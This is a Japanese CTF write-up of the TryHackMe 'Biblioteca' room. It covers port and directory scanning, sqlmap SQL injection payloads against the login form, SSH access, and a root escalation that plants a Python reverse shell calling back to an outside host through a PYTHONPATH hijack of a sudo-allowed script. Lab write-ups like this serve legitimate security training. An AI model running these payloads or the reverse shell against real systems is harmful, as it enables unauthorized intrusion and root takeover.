# Biblioteca CTF

https://tryhackme.com/room/biblioteca

## Enumeration

```shell
TARGET=10.64.149.183
sudo bash -c "echo $TARGET   biblioteca.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 64
8000/tcp open  http-alt syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,8000 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
```

SSH, HTTP

### ディレクトリ列挙

```sh
dirb http://biblioteca.thm:8000

---- Scanning URL: http://biblioteca.thm:8000/ ----
+ http://biblioteca.thm:8000/login (CODE:200|SIZE:856)                                                               
+ http://biblioteca.thm:8000/logout (CODE:302|SIZE:218)                                                              
+ http://biblioteca.thm:8000/register (CODE:200|SIZE:964)                                                            
-----------------
```

login, logout, register のみ発見。

`thm` というユーザー名で登録してログインしたら、名前が表示された。

```
Hi thm!!

Welcome to the index page...
```

### SSTI

`{{7*'7'}}` というユーザー名で登録しようとしたが、Only Characters and Numbers とのエラー表示で登録できなかった。  
ただ、ユーザー登録できていない状態で `{{7*'7'}}` でログインしようとするとサーバー内部エラーが派生した。

`{}` 文字を使えないとどうにもならない。

### SQLi

ログインリクエストに対して sqlmap を実行したら username に脆弱性を発見した。

```sh
$ sqlmap -r ./login.txt --dbs --batch

[10:59:35] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 60 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 6125 FROM (SELECT(SLEEP(5)))agsc) AND 'ypFX'='ypFX&password=password

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=admin' UNION ALL SELECT NULL,CONCAT(0x717a716a71,0x62424d795279516a594c416b61594d7274654970694459747446764d506b6a4c7373757867654674,0x7170787171),NULL,NULL-- -&password=password
---
[10:59:35] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[10:59:37] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] performance_schema
[*] website
```

usersテーブルをダンプ。

```txt
Table: users
[1 entry]
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | [REDACTED]     | smokey   |
+----+-------------------+----------------+----------+
```

このパスワードを使ってWebにログインしても何もなかったが、SSH接続できた。

## 権限昇格１

ユーザーフラグは、hazel に昇格する必要がある。

```sh
smokey@ip-10-65-172-44:~$ ls -al
total 28
drwxr-xr-x 3 smokey smokey 4096 Dec  7  2021 .
drwxr-xr-x 5 root   root   4096 Nov 20 01:55 ..
lrwxrwxrwx 1 root   root      9 Dec  7  2021 .bash_history -> /dev/null
-rw-r--r-- 1 smokey smokey  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 smokey smokey 3771 Feb 25  2020 .bashrc
drwx------ 2 smokey smokey 4096 Dec  7  2021 .cache
lrwxrwxrwx 1 root   root      9 Dec  7  2021 .mysql_history -> /dev/null
-rw-r--r-- 1 smokey smokey  807 Feb 25  2020 .profile
-rw-rw-r-- 1 smokey smokey   75 Dec  7  2021 .selected_editor
-rw-r--r-- 1 smokey smokey    0 Dec  7  2021 .sudo_as_admin_successful
-rw------- 1 smokey smokey    0 Dec  7  2021 .viminfo
```

```sh
smokey@ip-10-65-172-44:~$ ls -al /home
total 20
drwxr-xr-x  5 root   root   4096 Nov 20 01:55 .
drwxr-xr-x 19 root   root   4096 Nov 20 01:55 ..
drwxr-xr-x  3 root   root   4096 Mar  2  2022 hazel
drwxr-xr-x  3 smokey smokey 4096 Dec  7  2021 smokey
drwxr-xr-x  3 ubuntu ubuntu 4096 Nov 20 01:55 ubuntu
```

```sh
smokey@ip-10-65-172-44:~$ ls -al /home/hazel
total 32
drwxr-xr-x 3 root  root  4096 Mar  2  2022 .
drwxr-xr-x 5 root  root  4096 Nov 20 01:55 ..
lrwxrwxrwx 1 root  root     9 Dec  7  2021 .bash_history -> /dev/null
-rw-r--r-- 1 hazel hazel  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 hazel hazel 3771 Feb 25  2020 .bashrc
drwx------ 2 hazel hazel 4096 Dec  7  2021 .cache
-rw-r----- 1 root  hazel  497 Dec  7  2021 hasher.py
-rw-r--r-- 1 hazel hazel  807 Feb 25  2020 .profile
-rw-r----- 1 root  hazel   45 Mar  2  2022 user.txt
-rw------- 1 hazel hazel    0 Dec  7  2021 .viminfo
```

自分が知っている全ての列挙を試したが、何も出てこなかった。

「弱いパスワード」というヒントを見て、ユーザー名と同じパスワードを試したら昇格できた。

```sh
smokey@ip-10-65-172-44:~$ su hazel
Password: 
hazel@ip-10-65-172-44:/home/smokey$ 
```

## 権限昇格２

sudo で hasher.py を実行できる。

```sh
hazel@ip-10-65-172-44:~$ sudo -l
Matching Defaults entries for hazel on ip-10-65-172-44:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on ip-10-65-172-44:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

hashlib.md5 をインジェクションできれば昇格できる。

```python
hazel@ip-10-65-172-44:~$ cat hasher.py
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()
```

/home/hazel ディレクトリに書き込み権限がないのでファイル保存できないが、SETENV が設定されているのでインポートディレクトリを設定できる。

```
(root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

/tmp/hashlib.py を保存。

```python
def md5(dummy):
    import socket,subprocess,os;
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("192.168.129.60",8888));
    os.dup2(s.fileno(),0);
    os.dup2(s.fileno(),1);
    os.dup2(s.fileno(),2);
    import pty;
    pty.spawn("/bin/sh")
```

PYTHONPATH を指定して実行

```sh
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

成功

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.129.60] from (UNKNOWN) [10.65.172.44] 40650
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- 斬新な権限昇格

## Tags

#tags:SQLi
